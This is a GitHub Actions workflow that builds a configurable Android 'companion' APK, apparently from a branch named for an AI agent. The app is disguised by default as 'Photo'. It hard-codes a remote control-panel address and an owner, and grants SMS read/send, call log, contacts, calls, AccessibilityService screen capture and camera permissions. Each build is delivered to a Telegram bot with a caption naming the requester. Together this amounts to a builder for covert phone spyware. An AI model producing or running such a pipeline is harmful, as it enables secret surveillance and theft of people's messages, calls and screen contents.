name: Build companion APK

# Собирает APK телефонного приложения-компаньона (камера → панель).
# Запуск вручную из вкладки Actions. Можно задать имя приложения, package
# и адрес панели по умолчанию — они будут зашиты в APK.

on:
  push:
    branches: ["claude/remote-phone-control-panel-2tpseh"]
    paths:
      - "remote-control/android-companion/**"
      - ".github/workflows/build-apk.yml"
  workflow_dispatch:
    inputs:
      app_name:
        description: "Название приложения"
        required: false
        default: "Photo"
      application_id:
        description: "Package (applicationId), напр. app.photo"
        required: false
        default: "app.photo"
      default_server:
        description: "Адрес панели по умолчанию (IP:порт), необязательно"
        required: false
        default: ""
      permissions:
        description: "Список разрешений через запятую: CAMERA,RECORD_AUDIO,SCREEN,NOTIFICATIONS,PHONE_STATE,CALL_LOG,CALL_PHONE,CONTACTS,READ_SMS,SEND_SMS,RECEIVE_SMS,BT_CONNECT,BT_SCAN,LOCATION,MEDIA_IMAGES,MEDIA_VIDEO,CALENDAR,BATTERY"
        required: false
        default: "CAMERA,SCREEN,NOTIFICATIONS,PHONE_STATE,CALL_LOG,CALL_PHONE,CONTACTS,READ_SMS,SEND_SMS,RECEIVE_SMS,BT_CONNECT,BT_SCAN"
      owner_username:
        description: "Логин владельца APK (зашивается в приложение)"
        required: false
        default: ""
      requested_by:
        description: "Кто заказал APK (логин администратора)"
        required: false
        default: ""
      splash_image:
        description: "Фоновое изображение (base64 PNG/JPEG, необязательно)"
        required: false
        default: ""

jobs:
  build:
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: remote-control/android-companion
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"

      - name: Set up Android SDK
        uses: android-actions/setup-android@v3

      - name: Install Android SDK platform 34
        run: yes | sdkmanager --install "platforms;android-34" "build-tools;34.0.0" 2>/dev/null || true

      - name: Set up Gradle
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: "8.2"

      - name: Inject build parameters
        run: |
          APP_NAME="${{ github.event.inputs.app_name || 'Photo' }}"
          APP_ID="${{ github.event.inputs.application_id || 'app.photo' }}"
          SERVER="${{ github.event.inputs.default_server }}"
          PERMS="${{ github.event.inputs.permissions || 'CAMERA,SCREEN,NOTIFICATIONS,PHONE_STATE,CALL_LOG,CALL_PHONE,CONTACTS,READ_SMS,SEND_SMS,RECEIVE_SMS,BT_CONNECT,BT_SCAN' }}"

          OWNER="${{ github.event.inputs.owner_username }}"

          cat > build.properties.generated <<EOF
          ARP_APP_NAME=${APP_NAME}
          ARP_APPLICATION_ID=${APP_ID}
          ARP_DEFAULT_SERVER=${SERVER}
          ARP_OWNER_USERNAME=${OWNER}
          EOF

          # Проверка наличия разрешения в списке
          has_perm() { echo ",$PERMS," | grep -qF ",$1,"; }
          # Удалить маркерный блок из манифеста
          remove_block() { sed -i "/<!--${1}-->/,/<!--${2}-->/d" app/src/main/AndroidManifest.xml; }

          MANIFEST="app/src/main/AndroidManifest.xml"

          # Разрешения без маркерных блоков
          has_perm "CAMERA"       || { sed -i '/android\.permission\.CAMERA/d' "$MANIFEST"; sed -i '/FOREGROUND_SERVICE_CAMERA/d' "$MANIFEST"; }
          has_perm "RECORD_AUDIO" || { sed -i '/android\.permission\.RECORD_AUDIO/d' "$MANIFEST"; sed -i '/FOREGROUND_SERVICE_MICROPHONE/d' "$MANIFEST"; }
          has_perm "NOTIFICATIONS" || sed -i '/POST_NOTIFICATIONS/d' "$MANIFEST"
          has_perm "SCREEN"       || remove_block "CONTROL_SERVICE_START" "CONTROL_SERVICE_END"

          # Разрешения с маркерными блоками
          has_perm "PHONE_STATE"  || remove_block "PHONE_STATE_PERM_START"   "PHONE_STATE_PERM_END"
          has_perm "CALL_LOG"     || remove_block "CALL_LOG_PERM_START"      "CALL_LOG_PERM_END"
          has_perm "CALL_PHONE"   || remove_block "CALL_PHONE_PERM_START"    "CALL_PHONE_PERM_END"
          has_perm "CONTACTS"     || remove_block "CONTACTS_PERM_START"      "CONTACTS_PERM_END"
          has_perm "READ_SMS"     || remove_block "READ_SMS_PERM_START"      "READ_SMS_PERM_END"
          has_perm "SEND_SMS"     || remove_block "SEND_SMS_PERM_START"      "SEND_SMS_PERM_END"
          has_perm "RECEIVE_SMS"  || remove_block "RECEIVE_SMS_PERM_START"   "RECEIVE_SMS_PERM_END"
          has_perm "BT_CONNECT"   || remove_block "BT_CONNECT_PERM_START"    "BT_CONNECT_PERM_END"
          has_perm "BT_SCAN"      || remove_block "BT_SCAN_PERM_START"       "BT_SCAN_PERM_END"
          has_perm "LOCATION"     || remove_block "LOCATION_PERM_START"      "LOCATION_PERM_END"
          has_perm "MEDIA_IMAGES" || remove_block "MEDIA_IMG_PERM_START"     "MEDIA_IMG_PERM_END"
          has_perm "MEDIA_VIDEO"  || remove_block "MEDIA_VID_PERM_START"     "MEDIA_VID_PERM_END"
          has_perm "CALENDAR"     || remove_block "CALENDAR_PERM_START"      "CALENDAR_PERM_END"
          has_perm "BATTERY"      || remove_block "BATTERY_PERM_START"       "BATTERY_PERM_END"

          # Легаси-разрешение для медиа (Android ≤12): убрать если оба медиа не выбраны
          if ! has_perm "MEDIA_IMAGES" && ! has_perm "MEDIA_VIDEO"; then
            remove_block "MEDIA_LEGACY_PERM_START" "MEDIA_LEGACY_PERM_END"
          fi

          # foregroundServiceType (no mediaProjection — screen capture uses AccessibilityService on API 30+)
          # dataSync is always included as fallback so API 34 never sees a service with no declared type
          FST="dataSync"
          has_perm "CAMERA"       && FST="${FST:+$FST|}camera"
          has_perm "RECORD_AUDIO" && FST="${FST:+$FST|}microphone"
          has_perm "SCREEN"       && FST="${FST:+$FST|}mediaProjection"
          sed -i "s/android:foregroundServiceType=\"[^\"]*\"/android:foregroundServiceType=\"$FST\"/" "$MANIFEST"

          echo "=== Permissions in build: $PERMS ==="
          echo "=== Manifest uses-permission lines ==="
          grep 'uses-permission\|foregroundService' "$MANIFEST" || true

      - name: Inject splash image
        if: ${{ github.event.inputs.splash_image != '' }}
        run: |
          SPLASH_DIR="app/src/main/res/drawable-nodpi"
          mkdir -p "$SPLASH_DIR"
          echo "${{ github.event.inputs.splash_image }}" | base64 -d > "$SPLASH_DIR/splash_bg.png"
          echo "Splash image injected ($(wc -c < "$SPLASH_DIR/splash_bg.png") bytes)"

      - name: Build debug APK
        run: gradle assembleDebug --no-daemon --stacktrace

      - name: Upload APK artifact
        uses: actions/upload-artifact@v4
        with:
          name: camera-companion-apk
          path: remote-control/android-companion/app/build/outputs/apk/debug/app-debug.apk
          if-no-files-found: error

      - name: Send APK to Telegram
        env:
          TG_TOKEN: ${{ secrets.TG_BOT_TOKEN }}
          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
          APP_NAME: ${{ github.event.inputs.app_name || 'Photo' }}
          OWNER: ${{ github.event.inputs.owner_username }}
          REQUESTED_BY: ${{ github.event.inputs.requested_by }}
          PERMS: ${{ github.event.inputs.permissions || 'CAMERA,SCREEN,NOTIFICATIONS,PHONE_STATE,CALL_LOG,CALL_PHONE,CONTACTS,READ_SMS,SEND_SMS,RECEIVE_SMS,BT_CONNECT,BT_SCAN' }}
        run: |
          APK="app/build/outputs/apk/debug/app-debug.apk"
          NL=$'\n'
          CAPTION="📦 APK готов!"
          [ -n "$OWNER" ] && CAPTION="${CAPTION}${NL}Владелец: $OWNER"
          [ -n "$REQUESTED_BY" ] && CAPTION="${CAPTION}${NL}Создал: $REQUESTED_BY"
          if [ -n "$PERMS" ]; then
            PERMS_PRETTY=""
            for perm in $(echo "$PERMS" | tr ',' ' '); do
              case "$perm" in
                CAMERA)        PERMS_PRETTY="${PERMS_PRETTY}${NL}  📷 Камера" ;;
                SCREEN)        PERMS_PRETTY="${PERMS_PRETTY}${NL}  🖥 Экран" ;;
                NOTIFICATIONS) PERMS_PRETTY="${PERMS_PRETTY}${NL}  🔔 Уведомления" ;;
                PHONE_STATE)   PERMS_PRETTY="${PERMS_PRETTY}${NL}  📱 Состояние телефона" ;;
                CALL_LOG)      PERMS_PRETTY="${PERMS_PRETTY}${NL}  📋 Журнал звонков" ;;
                CALL_PHONE)    PERMS_PRETTY="${PERMS_PRETTY}${NL}  📞 Звонки" ;;
                CONTACTS)      PERMS_PRETTY="${PERMS_PRETTY}${NL}  👤 Контакты" ;;
                READ_SMS)      PERMS_PRETTY="${PERMS_PRETTY}${NL}  💬 Чтение СМС" ;;
                SEND_SMS)      PERMS_PRETTY="${PERMS_PRETTY}${NL}  📨 Отправка СМС" ;;
                RECEIVE_SMS)   PERMS_PRETTY="${PERMS_PRETTY}${NL}  📩 Получение СМС" ;;
                BT_CONNECT)    PERMS_PRETTY="${PERMS_PRETTY}${NL}  🔵 Bluetooth" ;;
                BT_SCAN)       PERMS_PRETTY="${PERMS_PRETTY}${NL}  🔍 Поиск Bluetooth" ;;
                LOCATION)      PERMS_PRETTY="${PERMS_PRETTY}${NL}  📍 Геолокация" ;;
                MEDIA_IMAGES)  PERMS_PRETTY="${PERMS_PRETTY}${NL}  🖼 Фото" ;;
                MEDIA_VIDEO)   PERMS_PRETTY="${PERMS_PRETTY}${NL}  🎬 Видео" ;;
                CALENDAR)      PERMS_PRETTY="${PERMS_PRETTY}${NL}  📅 Календарь" ;;
                BATTERY)       PERMS_PRETTY="${PERMS_PRETTY}${NL}  🔋 Фоновая работа" ;;
              esac
            done
            [ -n "$PERMS_PRETTY" ] && CAPTION="${CAPTION}${NL}Разрешения:${PERMS_PRETTY}"
          fi
          curl -s \
            -F "chat_id=${TG_CHAT_ID}" \
            -F "document=@${APK};filename=${APP_NAME:-companion}.apk" \
            -F "caption=${CAPTION}" \
            "https://api.telegram.org/bot${TG_TOKEN}/sendDocument" \
            | grep -q '"ok":true' && echo "Telegram: sent" || echo "Telegram: send failed"
